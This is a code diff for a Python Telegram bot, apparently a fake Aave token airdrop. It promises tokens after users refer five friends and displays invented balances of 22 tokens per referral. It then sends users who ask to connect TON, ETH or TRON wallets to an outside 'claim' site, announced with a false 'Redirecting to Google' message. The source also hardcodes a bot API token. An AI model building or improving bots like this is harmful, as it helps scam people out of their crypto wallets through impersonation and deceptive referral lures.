@@ -1,86 +1,109 @@
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
-from db_handler import init_db, add_or_update_user, update_referrals, get_user_data, get_user_id_by_username
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
+from db_handler import init_db, add_or_update_user, update_referrals, get_user_data, get_referred_users
+import logging
 
-# Function to handle button click
-async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    user_id = query.from_user.id
-    username = query.from_user.username
-
-    # Get updated referral count
-    referrals = get_user_data(user_id)
-
-    # Check if the user has 5 or more referrals
-    if query.data == 'generate_referral':
-        # Handle the case when the user does not have a username
-        if username is None:
-            username = str(user_id)
-
-        # Generate and send referral link
-        referral_link = f"https://t.me/AAVEclaim_bot?start=referral_{username}"
-        await query.answer()
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Your referral link is: {referral_link}")
-
-    elif referrals >= 5:
-        # Redirect to your website if the user has enough referrals
-        await query.answer()
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Congratulations! You have {referrals} referrals. You can now check wallet eligibility:",
-                                      reply_markup=InlineKeyboardMarkup([
-                                          [InlineKeyboardButton("TON", url='https://aavetoks-claim.site'),
-                                           InlineKeyboardButton("ETH", url='https://aavetoks-claim.site'),
-                                           InlineKeyboardButton("TRON", url='https://aavetoks-claim.site')],
-                                          [InlineKeyboardButton("Join Channel", url='https://t.me/JoinAave')]
-                                      ]))
-    else:
-        # If the user has less than 5 referrals, inform them
-        await query.answer(text="You need at least 5 referrals to access these tabs.")
+# Set up logging to print debug information
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 # Function to handle /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     username = update.effective_user.username
 
-    # Check for referral
-    if context.args:
-        referrer_username = context.args[0].split('_')[-1]  # Extract referrer username from start parameter
-        if referrer_username != username:  # Avoid self-referral
-            referrer_user_id = get_user_id_by_username(referrer_username)
-            if referrer_user_id:
-                update_referrals(referrer_user_id)  # Update referral count for the referrer
+    logger.info(f"User {user_id} started the bot with username: {username}")
 
-    # Add or update user in the database
     add_or_update_user(user_id, username)
 
-    # Check the referral count
-    referrals = get_user_data(user_id)
+    referrals = get_user_data(user_id)['referrals']
+    logger.info(f"User {user_id} has {referrals} referrals.")
 
-    # Show message and buttons based on referral count
     keyboard = [
-        [InlineKeyboardButton("Generate Referral Link", callback_data='generate_referral')],
-        [InlineKeyboardButton("TON", callback_data='ton'),
-         InlineKeyboardButton("ETH", callback_data='eth'),
-         InlineKeyboardButton("TRON", callback_data='tron')],
-        [InlineKeyboardButton("Join Channel", url='https://t.me/JoinAave')]
+        [InlineKeyboardButton("Open Referral Program", web_app=WebAppInfo(url="https://aavebot-html.vercel.app/"))]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    # Send image with the airdrop description
-    with open('/root/aavebot/bot/aaveicon.jpg', 'rb') as img:  # Replace 'airdrop.jpg' with your file path and name
-        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=InputFile(img), caption=f"Welcome! You currently have {referrals} referrals. Invite 5 friends to unlock your claim.", reply_markup=reply_markup)
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=f"Welcome! You currently have {referrals} referrals. Invite 5 friends to unlock your claim.",
+        reply_markup=reply_markup
+    )
+    logger.info(f"Sent welcome message to user {user_id}.")
+
+# Function to handle data sent from WebApp
+async def webapp_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message and update.message.web_app_data:
+        user_id = update.effective_user.id
+        data = update.message.web_app_data.data
+
+        logger.info(f"User {user_id} sent WebApp data: {data}")
+
+        if data == 'generate_referral':
+            username = update.effective_user.username or str(user_id)
+            referral_link = f"https://t.me/AAVEclaim_bot?start=referral_{username}"
+            
+            # Send referral link to the user
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"Your referral link is: {referral_link}"
+            )
+            logger.info(f"Sent referral link to user {user_id}: {referral_link}")
+
+            # Retrieve referred users and send them
+            referred_users = get_referred_users(user_id)
+            referred_users_list = "\n".join([f"- {user}" for user in referred_users]) or "No referred users yet."
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"Referred Users:\n{referred_users_list}"
+            )
+            logger.info(f"Sent referred users list to user {user_id}")
+
+        elif data == 'check_wallet':
+            user_data = get_user_data(user_id)
+            referrals = user_data['referrals']
+            balance = referrals * 22  # Assume each referral gives 22 tokens
+            if referrals >= 5:
+                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"You have {balance} $AAVE tokens.")
+                logger.info(f"User {user_id} has enough referrals: {referrals}. Balance: {balance}.")
+            else:
+                await context.bot.send_message(chat_id=update.effective_chat.id, text="You need at least 5 referrals to unlock rewards.")
+                logger.info(f"User {user_id} does not have enough referrals: {referrals}.")
+
+# Function to handle connect button clicks
+async def connect_buttons_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message and update.message.text:
+        text = update.message.text.lower()
+
+        if "connect ton" in text or "connect eth" in text or "connect tron" in text:
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="Redirecting to Google...")
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="https://aavetoks-claim.site")
+            logger.info(f"User {update.effective_user.id} clicked connect button.")
+
+    else:
+        logger.warning(f"No message text found in the update: {update}")
+
+# Function to log unhandled messages
+async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    logger.info(f"Unhandled message received: {update}")
 
 def main():
     application = ApplicationBuilder().token("7212377554:AAEQhO0o3djcL03N_vCtlwD48IBrLK-2yIg").build()
 
-    # Initialize the database
     init_db()
 
-    # Register command and button handlers
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(button_click_handler))
+    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, webapp_data_handler))
+    application.add_handler(MessageHandler(filters.Text, connect_buttons_handler))
+    application.add_handler(MessageHandler(filters.ALL, message_handler))
 
-    # Run the bot
+    logger.info("Bot is starting...")
     application.run_polling()
 
 if __name__ == '__main__':
     main()
+
+
